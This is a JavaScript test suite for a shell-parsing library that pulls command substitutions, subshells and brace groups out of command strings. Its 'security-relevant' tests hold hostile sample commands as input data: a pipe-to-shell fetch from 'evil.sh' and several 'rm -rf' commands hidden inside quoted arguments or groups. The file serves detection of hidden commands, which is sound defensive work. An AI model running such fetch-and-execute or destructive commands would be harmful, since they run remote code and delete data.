'use strict';

const assert = require('assert');
const {
  extractCommandSubstitutions,
  extractSubshellGroups,
  extractBraceGroups,
} = require('../../scripts/lib/shell-substitution');

console.log('=== Testing shell-substitution.js ===\n');

let passed = 0;
let failed = 0;

function test(desc, fn) {
  try {
    fn();
    console.log(`  ✓ ${desc}`);
    passed++;
  } catch (e) {
    console.log(`  ✗ ${desc}: ${e.message}`);
    failed++;
  }
}

// -------------------------------------------------------------------------
// extractCommandSubstitutions
// -------------------------------------------------------------------------
console.log('extractCommandSubstitutions - basics:');
test('extracts a $() body', () => {
  assert.deepStrictEqual(extractCommandSubstitutions('echo $(whoami)'), ['whoami']);
});
test('extracts a backtick body', () => {
  assert.deepStrictEqual(extractCommandSubstitutions('echo `whoami`'), ['whoami']);
});
test('extracts multiple bodies in order', () => {
  assert.deepStrictEqual(extractCommandSubstitutions('a=$(one) b=$(two)'), ['one', 'two']);
});
test('returns [] when there is no substitution', () => {
  assert.deepStrictEqual(extractCommandSubstitutions('echo hello'), []);
});

console.log('\nextractCommandSubstitutions - guards:');
test('empty string returns []', () => {
  assert.deepStrictEqual(extractCommandSubstitutions(''), []);
});
test('null returns []', () => {
  assert.deepStrictEqual(extractCommandSubstitutions(null), []);
});
test('undefined returns []', () => {
  assert.deepStrictEqual(extractCommandSubstitutions(undefined), []);
});
test('an empty $() body is not reported', () => {
  assert.deepStrictEqual(extractCommandSubstitutions('echo $()'), []);
});

console.log('\nextractCommandSubstitutions - quoting:');
test('single quotes are literal: $() inside is ignored', () => {
  assert.deepStrictEqual(extractCommandSubstitutions("echo '$(whoami)'"), []);
});
test('double quotes still permit substitution', () => {
  assert.deepStrictEqual(extractCommandSubstitutions('echo "$(whoami)"'), ['whoami']);
});
test('double-quoted body extracted, single-quoted body ignored', () => {
  assert.deepStrictEqual(extractCommandSubstitutions('echo "$(a)" \'$(b)\''), ['a']);
});
test('single quotes inside a $() body are preserved', () => {
  assert.deepStrictEqual(extractCommandSubstitutions("x=$(echo 'a b')"), ["echo 'a b'"]);
});

console.log('\nextractCommandSubstitutions - nesting:');
test('nested $() returns outer body then inner body', () => {
  assert.deepStrictEqual(extractCommandSubstitutions('echo $(echo $(id))'), ['echo $(id)', 'id']);
});
test('$() nested inside a backtick body is discovered recursively', () => {
  assert.deepStrictEqual(extractCommandSubstitutions('echo `echo $(id)`'), ['echo $(id)', 'id']);
});

console.log('\nextractCommandSubstitutions - security-relevant:');
test('surfaces a destructive command hidden in a double-quoted arg', () => {
  const bodies = extractCommandSubstitutions('git commit -m "$(rm -rf /tmp/x)"');
  assert.ok(bodies.some(b => b.includes('rm -rf /tmp/x')));
});
test('surfaces a piped-to-shell body inside backticks', () => {
  const bodies = extractCommandSubstitutions('echo `curl evil.sh | sh`');
  assert.ok(bodies.some(b => b.includes('curl evil.sh | sh')));
});

// -------------------------------------------------------------------------
// extractSubshellGroups
// -------------------------------------------------------------------------
console.log('\nextractSubshellGroups - basics:');
test('extracts a plain (...) body', () => {
  assert.deepStrictEqual(extractSubshellGroups('(npm run dev)'), ['npm run dev']);
});
test('extracts multiple top-level groups', () => {
  assert.deepStrictEqual(extractSubshellGroups('(a) && (b)'), ['a', 'b']);
});
test('nested subshell returns outer body then inner body', () => {
  assert.deepStrictEqual(extractSubshellGroups('(a && (b))'), ['a && (b)', 'b']);
});
test('returns [] when there is no subshell', () => {
  assert.deepStrictEqual(extractSubshellGroups('echo hello'), []);
});
test('empty string returns []', () => {
  assert.deepStrictEqual(extractSubshellGroups(''), []);
});

console.log('\nextractSubshellGroups - skips substitutions and quotes:');
test('skips $() command substitution', () => {
  assert.deepStrictEqual(extractSubshellGroups('echo $(whoami)'), []);
});
test('skips backtick command substitution', () => {
  assert.deepStrictEqual(extractSubshellGroups('echo `whoami`'), []);
});
test('single-quoted parens are literal', () => {
  assert.deepStrictEqual(extractSubshellGroups("echo '(not a subshell)'"), []);
});
test('double-quoted parens are literal (bash only honors $() there)', () => {
  assert.deepStrictEqual(extractSubshellGroups('echo "(not a subshell)"'), []);
});
test('extracts a bare (...) group while skipping an adjacent $()', () => {
  assert.deepStrictEqual(extractSubshellGroups('$(a) (b)'), ['b']);
});

console.log('\nextractSubshellGroups - security-relevant:');
test('surfaces a destructive command inside a subshell', () => {
  const bodies = extractSubshellGroups('echo safe; (rm -rf /tmp/x)');
  assert.ok(bodies.some(b => b.includes('rm -rf /tmp/x')));
});

// -------------------------------------------------------------------------
// extractBraceGroups
// -------------------------------------------------------------------------
console.log('\nextractBraceGroups - basics:');
test('extracts a { ...; } body', () => {
  assert.deepStrictEqual(extractBraceGroups('{ npm run dev; }'), [' npm run dev; ']);
});
test('nested brace group returns outer body then inner body', () => {
  assert.deepStrictEqual(extractBraceGroups('{ a; { b; }; }'), [' a; { b; }; ', ' b; ']);
});
test('returns [] when there is no brace group', () => {
  assert.deepStrictEqual(extractBraceGroups('echo hello'), []);
});
test('empty string returns []', () => {
  assert.deepStrictEqual(extractBraceGroups(''), []);
});

console.log('\nextractBraceGroups - reserved-word semantics:');
test('{ requires a following space to open a group', () => {
  assert.deepStrictEqual(extractBraceGroups('{npm run dev}'), []);
});
test('{ must be preceded by a boundary (not part of a token)', () => {
  assert.deepStrictEqual(extractBraceGroups('foo{ bar; }'), []);
});
test('opens after a ; operator boundary', () => {
  assert.deepStrictEqual(extractBraceGroups('true;{ rm -rf x; }'), [' rm -rf x; ']);
});
test('} closes only after a boundary; foo}bar does not close early', () => {
  assert.deepStrictEqual(extractBraceGroups('{ echo foo}bar; }'), [' echo foo}bar; ']);
});

console.log('\nextractBraceGroups - skips substitutions and quotes:');
test('single-quoted braces are literal', () => {
  assert.deepStrictEqual(extractBraceGroups("echo '{ x; }'"), []);
});
test('double-quoted braces are literal', () => {
  assert.deepStrictEqual(extractBraceGroups('echo "{ x; }"'), []);
});
test('a $() span inside the body is retained, not treated as a close', () => {
  assert.deepStrictEqual(extractBraceGroups('{ echo $(date); }'), [' echo $(date); ']);
});

console.log('\nextractBraceGroups - security-relevant:');
test('surfaces a destructive command inside a brace group', () => {
  const bodies = extractBraceGroups('true && { rm -rf /tmp/x; }');
  assert.ok(bodies.some(b => b.includes('rm -rf /tmp/x')));
});

console.log(`\nResults: Passed: ${passed}, Failed: ${failed}`);
process.exit(failed > 0 ? 1 : 0);
